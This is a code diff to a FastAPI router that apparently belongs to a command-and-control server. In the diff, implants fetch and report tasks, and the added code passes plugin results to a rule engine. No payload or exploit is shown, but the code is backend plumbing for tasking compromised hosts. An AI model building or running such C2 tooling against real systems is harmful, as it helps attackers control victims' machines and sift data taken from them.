@@ -3,12 +3,15 @@ from sqlalchemy.orm import Session
 from typing import List, Dict
 import os
 import uuid
+import json
 
 from . import models, security
 from .database import SessionLocal
 from .comms import manager
+from .intelligence import RuleEngine
 
 router = APIRouter()
+rule_engine = RuleEngine()
 
 # --- Dependency ---
 def get_db():
@@ -58,7 +61,6 @@ def get_tasks(db: Session = Depends(get_db), current_implant_id: str = Depends(s
     ).all()
     task_schemas = [models.TaskSchema.from_orm(task) for task in tasks_from_db]
 
-    # Mark tasks as dispatched instead of deleting them
     for task in tasks_from_db:
         task.status = "dispatched"
     db.commit()
@@ -78,6 +80,20 @@ def submit_task_result(payload: models.TaskResult, db: Session = Depends(get_db)
 
     task.result = payload.result
     task.status = "completed"
+
+    try:
+        result_data = json.loads(payload.result)
+        plugin_name = task.args.get("plugin_name")
+        if plugin_name and isinstance(result_data, dict):
+            rule_engine.process_data(
+                implant_id=current_implant_id,
+                plugin_name=plugin_name,
+                result=result_data,
+                db_session=db
+            )
+    except json.JSONDecodeError:
+        pass
+
     db.commit()
 
     return {"status": "result recorded"}
@@ -101,12 +117,10 @@ def add_task(implant_id: str, task: models.TaskCreate, db: Session = Depends(get
 
 @router.get("/admin/tasks/{implant_id}", response_model=List[models.TaskSchema])
 def get_implant_tasks(implant_id: str, db: Session = Depends(get_db)):
-    # First, check if the implant exists
     db_implant = db.query(models.Implant).filter(models.Implant.id == implant_id).first()
     if not db_implant:
         raise HTTPException(status_code=404, detail="Implant not found")
 
-    # Then, return its tasks
     tasks = db.query(models.Task).filter(models.Task.implant_id == implant_id).all()
     return tasks
 
